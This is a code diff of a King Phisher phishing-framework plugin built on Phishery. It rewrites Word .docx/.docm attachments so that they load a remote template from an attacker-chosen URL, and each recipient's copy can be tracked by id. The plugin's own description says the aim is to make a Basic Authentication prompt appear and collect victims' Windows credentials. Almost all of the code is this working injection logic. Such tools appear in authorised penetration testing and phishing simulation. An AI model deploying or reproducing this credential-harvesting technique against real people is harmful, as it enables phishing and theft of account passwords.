@@ -1,59 +1,41 @@
 import argparse
 import os
 import random
-import shutil
-import tempfile
 import zipfile
 
+import king_phisher.archive as archive
+import king_phisher.client.mailer as mailer
 import king_phisher.client.plugins as plugins
+
+import jinja2.exceptions
 
 PARSER_EPILOG = """\
 If no output file is specified, the input file will be modified in place.
 """
 
-def patch_zip_file(zin, zout, patches):
-	zout.comment = zin.comment
-	for item in zin.infolist():
-		data = zin.read(item.filename)
-		if item.filename in patches:
-			data = patches.pop(item.filename)
-			if data is None:
-				continue
-		zout.writestr(item, data)
-	for filename, data in patches.items():
-		zout.writestr(filename, data)
+def path_is_doc_file(path):
+	if os.path.splitext(path)[1] not in ('.docx', '.docm'):
+		return False
+	if not zipfile.is_zipfile(path):
+		return False
+	return True
 
 def phishery_inject(input_file, https_url, output_file=None):
 	input_file = os.path.abspath(input_file)
-	output_file = os.path.abspath(output_file or input_file)
-	if input_file == output_file:
-		tmpfd, output_file = tempfile.mkstemp(dir=os.path.dirname(input_file), suffix=os.path.splitext(input_file)[1])
-		os.close(tmpfd)
-		output_is_temp = True
-	else:
-		output_is_temp = False
-
+	patches = {}
 	rid = 'rId' + str(random.randint(10000, 99999))
 	settings = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\r\n'
 	settings += '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
 	settings += '<Relationship Id="{rid}" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="{target_url}" TargetMode="External"/>'
 	settings += '</Relationships>'
 	settings = settings.format(rid=rid, target_url=https_url)
-
-	patches = {
-		'word/_rels/settings.xml.rels': settings
-	}
+	patches['word/_rels/settings.xml.rels'] = settings
 	with zipfile.ZipFile(input_file, 'r') as zin:
 		settings = zin.read('word/settings.xml')
-		settings = settings.decode('utf-8')
-		settings = settings.replace('/><w', "/><w:attachedTemplate r:id=\"{0}\"/><w".format(rid), 1)
-		patches['word/settings.xml'] = settings
-		with zipfile.ZipFile(output_file, 'w') as zout:
-			patch_zip_file(zin, zout, patches=patches)
-
-	if output_is_temp:
-		shutil.copyfile(output_file, input_file)
-		os.unlink(output_file)
+	settings = settings.decode('utf-8')
+	settings = settings.replace('/><w', "/><w:attachedTemplate r:id=\"{0}\"/><w".format(rid), 1)
+	patches['word/settings.xml'] = settings
+	archive.patch_zipfile(input_file, patches, output_file=output_file)
 
 class Plugin(getattr(plugins, 'ClientPluginMailerAttachment', plugins.ClientPlugin)):
 	authors = ['Ryan Hanson', 'Spencer McIntyre']
@@ -61,29 +43,67 @@ class Plugin(getattr(plugins, 'ClientPluginMailerAttachment', plugins.ClientPlug
 	description = """
 	Use Phishery to inject Word Document Template URLs into DOCX files. This can
 	be used in conjunction with a server page that requires Basic Authentication
-	to collect Windows credentials. Note that the King Phisher server needs to
-	be configured with a proper, trusted SSL certificate for the user to be
-	presented with the basic authentication prompt.
+	to collect Windows credentials. Note that for HTTPS URLs, the King Phisher
+	server needs to be configured with a proper, trusted SSL certificate for
+	the user to be presented with the basic authentication prompt.
 
 	Phishery homepage: https://github.com/ryhanson/phishery
 	"""
 	homepage = 'https://github.com/securestate/king-phisher-plugins'
-	req_min_version = '1.8.0b0'
+	options = [
+		plugins.ClientOptionString(
+			'target_url',
+			'An optional target URL. The default is the phishing URL.',
+			default='{{ url.webserver }}',
+			display_name='Target URL'
+		)
+	]
+	req_min_version = '1.9.0b3'
 	version = '2.0'
 	def initialize(self):
 		mailer_tab = self.application.main_tabs['mailer']
 		self.text_insert = mailer_tab.tabs['send_messages'].text_insert
+		self.signal_connect('send-precheck', self.signal_send_precheck, gobject=mailer_tab)
 		return True
 
-	def process_attachment_file(self, input_path, output_path, target=None):
-		if os.path.splitext(input_path)[1] != '.docx':
-			return
-		url = self.application.config['mailer.webserver_url']
-		if target is not None:
-			url += '?id=' + target.uid
+	def _get_target_url(self, target):
+		target_url = self.config['target_url'].strip()
+		if target_url:
+			try:
+				target_url = mailer.render_message_template(target_url, self.application.config, target=target)
+			except jinja2.exceptions.TemplateSyntaxError as error:
+				self.logger.error("jinja2 syntax error ({0}) in target url: {1}".format(error.message, target_url))
+				self.text_insert("Jinja2 syntax error ({0}) in target url: {1}\n".format(error.message, target_url))
+				return None
+			except ValueError as error:
+				self.logger.error("value error ({0}) in target url: {1}".format(error, target_url))
+				self.text_insert("Value error ({0}) in target url: {1}\n".format(error, target_url))
+				return None
+		else:
+			target_url = self.application.config['mailer.webserver_url']
+			if target is not None:
+				target_url += '?id=' + target.uid
+		return target_url
 
-		phishery_inject(input_path, url, output_file=output_path)
-		self.logger.info('wrote docx file to: ' + output_path + ('' if target is None else ' with uid: ' + target.uid))
+	def process_attachment_file(self, input_path, output_path, target=None):
+		if not path_is_doc_file(input_path):
+			return
+		target_url = self._get_target_url(target)
+		if target_url is None:
+			self.logger.warning('failed to get the target url, can not inject into the docx file')
+			return
+		phishery_inject(input_path, target_url, output_file=output_path)
+		self.logger.info('wrote the patched file to: ' + output_path + ('' if target is None else ' with uid: ' + target.uid))
+
+	def signal_send_precheck(self, _):
+		input_path = self.application.config['mailer.attachment_file']
+		if not path_is_doc_file(input_path):
+			return
+		target_url = self._get_target_url(None)
+		if target_url is None:
+			self.text_insert('The phishery target URL is invalid.\n')
+			return False
+		return True
 
 def main():
 	parser = argparse.ArgumentParser(description='Phishery DOCX URL Injector Utility', conflict_handler='resolve')
